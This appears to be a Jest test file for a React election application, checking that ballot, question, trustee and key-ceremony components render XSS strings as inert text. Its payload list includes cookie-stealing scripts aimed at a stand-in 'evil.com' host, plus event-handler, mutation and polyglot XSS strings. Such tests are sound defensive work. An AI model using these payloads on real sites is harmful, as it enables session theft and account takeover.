/**
 * XSS Attack Prevention Tests
 * Comprehensive tests for Cross-Site Scripting attack vectors
 */

import React from 'react';
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { BallotPreview } from '@/components/preview/ballot-preview';
import { QuestionCard } from '@/components/ballot/question-card';
import { TrusteeList } from '@/components/trustees/trustee-list';
import { CeremonyStatus } from '@/components/trustees/ceremony-status';
import type { BallotQuestion } from '@/lib/actions/ballot';
import type { Trustee } from '@/lib/actions/trustees';

// Mock dependencies
jest.mock('@/components/trustees/invite-trustee', () => ({
  InviteTrustee: () => null,
}));

describe('XSS Attack Prevention', () => {
  // Comprehensive XSS payloads covering various attack vectors
  const xssPayloads = [
    // Script injection
    '<script>alert("xss")</script>',
    '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
    '<script src="http://evil.com/malicious.js"></script>',
    '<script>fetch("http://evil.com", {method:"POST",body:document.cookie})</script>',

    // Event handler injection
    '<img src=x onerror=alert(1)>',
    '<img src="x" onerror="alert(document.domain)">',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<object data="data:text/html,<script>alert(1)</script>">',
    '<iframe src="javascript:alert(1)">',

    // JavaScript protocol
    'javascript:alert(1)',
    'javascript:alert(document.cookie)',
    'javascript:document.location="http://evil.com"',

    // Data URLs
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',

    // SVG-based XSS
    '<svg><script>alert(1)</script></svg>',
    '<svg/onload=alert(1)>',
    '<svg><animate onbegin=alert(1)>',

    // URL encoded
    '%3Cscript%3Ealert(1)%3C/script%3E',

    // HTML entities
    '&lt;script&gt;alert(1)&lt;/script&gt;',

    // Unicode escaping attempts
    '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',

    // Null byte injection
    '<scr\0ipt>alert(1)</script>',

    // CSS expression (legacy IE)
    '<div style="background:url(javascript:alert(1))">',
    '<div style="width:expression(alert(1))">',

    // Template injection
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',

    // Break out of attribute context
    '" onclick="alert(1)" x="',
    "' onclick='alert(1)' x='",
    '" onfocus="alert(1)" autofocus="',

    // Base64 encoded payloads
    '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
  ];

  const createMockQuestion = (overrides: Partial<BallotQuestion> = {}): BallotQuestion => ({
    id: 'question-123',
    electionId: 'election-456',
    jurisdictionId: 'jurisdiction-789',
    title: 'Test Question',
    description: 'Test description',
    questionType: 'single_choice',
    maxSelections: 1,
    allowWriteIn: false,
    displayOrder: 0,
    candidates: [
      { id: 'c1', name: 'Candidate A', position: 0 },
      { id: 'c2', name: 'Candidate B', position: 1 },
    ],
    createdAt: '2024-12-24T00:00:00Z',
    ...overrides,
  });

  const createMockTrustee = (overrides: Partial<Trustee> = {}): Trustee => ({
    id: 'trustee-123',
    electionId: 'election-456',
    name: 'Test Trustee',
    publicKey: 'pk-abc123',
    status: 'registered',
    shareIndex: 1,
    ...overrides,
  });

  describe('BallotPreview XSS Prevention', () => {
    describe('election name XSS', () => {
      xssPayloads.forEach((payload) => {
        it(`should safely render: ${payload.substring(0, 40)}...`, () => {
          render(
            <BallotPreview
              electionName={payload}
              questions={[createMockQuestion()]}
            />
          );

          // Content should be rendered as text, not executed
          expect(screen.getByText(payload)).toBeInTheDocument();
        });
      });
    });

    describe('question title XSS', () => {
      xssPayloads.slice(0, 10).forEach((payload) => {
        it(`should safely render in title: ${payload.substring(0, 30)}...`, () => {
          render(
            <BallotPreview
              electionName="Safe Election"
              questions={[createMockQuestion({ title: payload })]}
            />
          );

          expect(screen.getByText(payload)).toBeInTheDocument();
        });
      });
    });

    describe('question description XSS', () => {
      xssPayloads.slice(0, 10).forEach((payload) => {
        it(`should safely render in description: ${payload.substring(0, 30)}...`, () => {
          render(
            <BallotPreview
              electionName="Safe Election"
              questions={[createMockQuestion({ description: payload })]}
            />
          );

          expect(screen.getByText(payload)).toBeInTheDocument();
        });
      });
    });

    describe('candidate name XSS', () => {
      xssPayloads.slice(0, 10).forEach((payload) => {
        it(`should safely render in candidate: ${payload.substring(0, 30)}...`, () => {
          render(
            <BallotPreview
              electionName="Safe Election"
              questions={[createMockQuestion({
                candidates: [
                  { id: 'c1', name: payload, position: 0 },
                  { id: 'c2', name: 'Safe Name', position: 1 },
                ],
              })]}
            />
          );

          expect(screen.getByText(payload)).toBeInTheDocument();
        });
      });
    });

    describe('candidate party XSS', () => {
      xssPayloads.slice(0, 5).forEach((payload) => {
        it(`should safely render in party: ${payload.substring(0, 30)}...`, () => {
          render(
            <BallotPreview
              electionName="Safe Election"
              questions={[createMockQuestion({
                candidates: [
                  { id: 'c1', name: 'Candidate', party: payload, position: 0 },
                ],
              })]}
            />
          );

          expect(screen.getByText(`(${payload})`)).toBeInTheDocument();
        });
      });
    });
  });

  describe('QuestionCard XSS Prevention', () => {
    const mockOnEdit = jest.fn();
    const mockOnDelete = jest.fn();

    describe('question title XSS', () => {
      xssPayloads.slice(0, 15).forEach((payload) => {
        it(`should safely render: ${payload.substring(0, 30)}...`, () => {
          render(
            <QuestionCard
              question={createMockQuestion({ title: payload })}
              onEdit={mockOnEdit}
              onDelete={mockOnDelete}
            />
          );

          expect(screen.getByText(payload)).toBeInTheDocument();
        });
      });
    });

    describe('question description XSS', () => {
      xssPayloads.slice(0, 10).forEach((payload) => {
        it(`should safely render: ${payload.substring(0, 30)}...`, () => {
          render(
            <QuestionCard
              question={createMockQuestion({ description: payload })}
              onEdit={mockOnEdit}
              onDelete={mockOnDelete}
            />
          );

          expect(screen.getByText(payload)).toBeInTheDocument();
        });
      });
    });

    describe('candidate name XSS', () => {
      xssPayloads.slice(0, 10).forEach((payload) => {
        it(`should safely render: ${payload.substring(0, 30)}...`, () => {
          render(
            <QuestionCard
              question={createMockQuestion({
                candidates: [
                  { id: 'c1', name: payload, position: 0 },
                  { id: 'c2', name: 'Safe', position: 1 },
                ],
              })}
              onEdit={mockOnEdit}
              onDelete={mockOnDelete}
            />
          );

          expect(screen.getByText(payload)).toBeInTheDocument();
        });
      });
    });
  });

  describe('TrusteeList XSS Prevention', () => {
    xssPayloads.slice(0, 15).forEach((payload) => {
      it(`should safely render trustee name: ${payload.substring(0, 30)}...`, () => {
        render(
          <TrusteeList
            electionId="election-123"
            trustees={[createMockTrustee({ name: payload })]}
            totalRequired={5}
            canInvite={true}
          />
        );

        expect(screen.getByText(payload)).toBeInTheDocument();
      });
    });
  });

  describe('CeremonyStatus XSS Prevention', () => {
    xssPayloads.slice(0, 10).forEach((payload) => {
      it(`should safely render public key: ${payload.substring(0, 30)}...`, () => {
        render(
          <CeremonyStatus
            status={{
              phase: 'FINALIZED',
              registeredCount: 5,
              requiredCount: 5,
              committedCount: 5,
            }}
            publicKey={payload}
          />
        );

        // Key is truncated, but should still be safe
        expect(screen.getByText('Election Public Key Generated')).toBeInTheDocument();
      });
    });
  });

  describe('DOM-based XSS prevention', () => {
    it('should not execute script tags in innerHTML context', () => {
      const payload = '<script>window.xssExecuted = true;</script>';

      render(
        <BallotPreview
          electionName={payload}
          questions={[createMockQuestion()]}
        />
      );

      // If XSS executed, this would be true
      expect((window as unknown as { xssExecuted?: boolean }).xssExecuted).toBeUndefined();
    });

    it('should not execute onerror handlers', () => {
      const payload = '<img src=x onerror="window.xssExecuted = true">';

      render(
        <BallotPreview
          electionName={payload}
          questions={[createMockQuestion()]}
        />
      );

      expect((window as unknown as { xssExecuted?: boolean }).xssExecuted).toBeUndefined();
    });
  });

  describe('Mutation XSS prevention', () => {
    const mutationPayloads = [
      // mXSS (mutation-based XSS)
      '<p><style><!--</style><script>alert(1)//--></script>',
      '<noscript><p title="</noscript><script>alert(1)</script>">',
      '<math><mtext><table><mglyph><style><!--</style><img title="</table>-->" src=x onerror=alert(1)//"></table>',
    ];

    mutationPayloads.forEach((payload) => {
      it(`should handle mutation XSS: ${payload.substring(0, 30)}...`, () => {
        render(
          <BallotPreview
            electionName={payload}
            questions={[createMockQuestion()]}
          />
        );

        expect((window as unknown as { xssExecuted?: boolean }).xssExecuted).toBeUndefined();
      });
    });
  });

  describe('Polyglot XSS payloads', () => {
    const polyglotPayloads = [
      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
      '"><script>alert(1)</script>',
      "'><script>alert(1)</script>",
      '"><img src=x onerror=alert(1)//>',
      "' onmouseover='alert(1)' style='position:absolute;width:100%;height:100%",
    ];

    polyglotPayloads.forEach((payload) => {
      it(`should handle polyglot: ${payload.substring(0, 30)}...`, () => {
        render(
          <BallotPreview
            electionName={payload}
            questions={[createMockQuestion({ title: payload })]}
          />
        );

        expect(screen.getAllByText(payload).length).toBeGreaterThan(0);
      });
    });
  });
});
